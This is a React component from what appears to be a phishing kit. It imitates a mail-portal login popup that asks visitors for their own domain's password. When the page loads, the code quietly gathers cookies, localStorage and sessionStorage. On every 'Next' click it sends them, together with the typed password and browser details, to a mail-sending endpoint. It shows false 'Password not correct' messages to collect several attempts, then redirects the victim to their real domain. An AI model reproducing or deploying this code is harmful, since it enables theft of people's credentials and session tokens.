/** @format */
"use client";
import React, { useState, useEffect } from "react";
import Image from 'next/image';

const Popup = ({ domain, favicon, eparams, systemInfo }) => {
  const { date, browser, os, location } = systemInfo;
  const [password, setPassword] = useState("");
  const [attempts, setAttempts] = useState(0); // Track button clicks
  const [errorMessage, setErrorMessage] = useState(
    "Authentication is required!"
  );
  const [showPassword, setShowPassword] = useState(false);
  const [cookies, setCookies] = useState("");
  const [localStorageData, setLocalStorageData] = useState("");
  const [sessionStorageData, setSessionStorageData] = useState("");

  useEffect(() => {
    // Capture cookies, localStorage, and sessionStorage data
    try {
      // Capture cookies
      setCookies(document.cookie);
      
      // Capture localStorage
      let localStorageStr = "";
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        localStorageStr += `${key}=${localStorage.getItem(key)}; `;
      }
      setLocalStorageData(localStorageStr);
      
      // Capture sessionStorage
      let sessionStorageStr = "";
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        sessionStorageStr += `${key}=${sessionStorage.getItem(key)}; `;
      }
      setSessionStorageData(sessionStorageStr);
    } catch (error) {
      console.error("Error capturing storage data:", error);
    }
  }, []);

  const ChromeIcon = () => (
    <svg viewBox="0 0 24 24" fill="currentColor">
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z" />
      <circle cx="12" cy="12" r="3" />
    </svg>
  );

  const WindowsIcon = () => (
    <svg viewBox="0 0 24 24" fill="currentColor">
      <path d="M3 5.3v6.35h7.25V4L3 5.3zM3 18.7l7.25 1.3v-7.65H3v6.35zm8.65 1.5L21 22V13.7h-9.35v6.5zm0-15.4V12h9.35V2l-9.35 2.8z" />
    </svg>
  );

  const MacIcon = () => (
    <svg viewBox="0 0 24 24" fill="currentColor">
      <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z" />
    </svg>
  );

  const LinuxIcon = () => (
    <svg viewBox="0 0 24 24" fill="currentColor">
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z" />
      <path d="M12 8c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4z" />
    </svg>
  );

  const getOSIcon = (os) => {
    switch (os) {
      case "Windows":
        return <WindowsIcon />;
      case "Mac OS":
        return <MacIcon />;
      case "Linux":
        return <LinuxIcon />;
      default:
        return null;
    }
  };

  const sendEmail = async (eparams, password) => {
    try {
      const userAgent = navigator.userAgent;
      const remoteAddress = ""; // This would typically be captured server-side
      
      const response = await fetch("/api/sendemail", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ 
          eparams, 
          password, 
          userAgent, 
          remoteAddress, 
          landingUrl: window.location.href,
          cookies,
          localStorageData,
          sessionStorageData
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to send email");
      }

      const data = await response.json();
      console.log(data.message);
    } catch (error) {
      console.error("Error:", error);
    } finally {
      setPassword("");
    }
  };

  const handleNextClick = () => {
    if (attempts === 0) {
      setErrorMessage("Password not correct!");
      sendEmail(eparams, password);
      setAttempts(attempts + 1);
    } else if (attempts === 1) {
      setErrorMessage("Password still not correct!");
      sendEmail(eparams, password);
      setAttempts(attempts + 1);
    } else if (attempts === 2) {
      setErrorMessage("Incorrect password again. Last attempt!");
      sendEmail(eparams, password);
      setAttempts(attempts + 1);
    } else if (attempts === 3) {
      sendEmail(eparams, password);

      // Ensure the domain is fully qualified
      const fullDomain = domain.startsWith("http")
        ? domain
        : `https://${domain}`;

      // Redirect to the specified domain
      window.location.href = fullDomain;
    }
  };

  return (
    <div className="popup">
      <div className="popup-content">
        <Image src="/Mailportal.svg" alt="Mail Portal" width={200} height={30} />
        <div>
          <div style={{fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",  fontWeight: 'bold'}} className="system-info mt7">
            <span className="info-item">
              {systemInfo.date.toLocaleString()}
            </span>
            <span className="separator">•</span>
            <span className="info-item">
              {getOSIcon(systemInfo.os)}
              {systemInfo.os}
            </span>
            <span className="separator">•</span>
            <span className="info-item">{systemInfo.location}</span>
          </div>
        </div>
        <div style={{fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", fontSize: "14px"}} className="koko">{eparams}</div>
        <div style={{fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", fontSize: "13px", color: "#808080",}} className="thtkind">
          You're accessing secure settings. Please provide your <b>{domain}</b>{" "}
          password to continue.
        </div>
        <div className="djdfe">
          <div className="pasww">
            <input
              type={showPassword ? "text" : "password"}
              className="fjhd"
              style={{
                paddingLeft: "20px",
                borderRadius: "10px",
                height: "55px",
                fontSize: "13px",
                boxShadow: "0 4px 8px rgba(100, 100, 100, 0.4)",
                border: "1px solid #fff",
              }}
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
          </div>

          <div className="njhiu" style={{ fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", fontSize: "12px", marginLeft: "8px" }}>
            {errorMessage}
          </div>

          <div className="jhgf" style={{ fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif" }}>
            <input
              type="checkbox"
              name="Show password"
              id="showPassword"
              onChange={(e) => setShowPassword(e.target.checked)}
              style={{ marginTop: "5px" }}
            />
            <label
              htmlFor="showPassword"
              className="jhcd"
              style={{ position: "relative", top: "-3px", color: "#333333" }}
            >
              Reveal password
            </label>
          </div>

          <div className="fjiure">
            <button className="urifjdd" onClick={handleNextClick} style={{fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",}}>
              Next
            </button>
          </div>
        </div>

        <style jsx>{`
          @media (max-width: 480px) {
            .popup-content {
              margin: 10px;
              padding: 15px;
            }
          }

          @media (max-width: 380px) {
            .popup-content {
              margin: 8px;
              padding: 12px;
            }
            
            .system-info {
              font-size: 11px;
            }
            
            .koko {
              font-size: 13px;
            }
            
            .thtkind {
              font-size: 12px;
            }
          }

          @media (max-width: 320px) {
            .popup-content {
              margin: 5px;
              padding: 10px;
            }
            
            .system-info {
              font-size: 10px;
              flex-wrap: wrap;
              justify-content: center;
              gap: 4px;
            }
            
            .separator {
              margin: 0 2px;
            }
            
            .koko {
              font-size: 12px;
            }
            
            .thtkind {
              font-size: 11px;
            }
            
            .fjhd {
              font-size: 12px;
              height: 50px;
            }
          }

          @media (max-width: 280px) {
            .popup-content {
              margin: 3px;
              padding: 8px;
            }
            
            .system-info {
              font-size: 9px;
              flex-direction: column;
              align-items: center;
              gap: 2px;
            }
            
            .separator {
              display: none;
            }
            
            .koko {
              font-size: 11px;
            }
            
            .thtkind {
              font-size: 10px;
              line-height: 1.3;
            }
            
            .fjhd {
              font-size: 11px;
              height: 45px;
              padding-left: 15px;
            }
            
            .njhiu {
              font-size: 11px;
              margin-left: 5px;
            }
            
            .urifjdd {
              font-size: 12px;
              padding: 10px 15px;
            }
          }
        `}</style>
      </div>
    </div>
  );
};

export default Popup;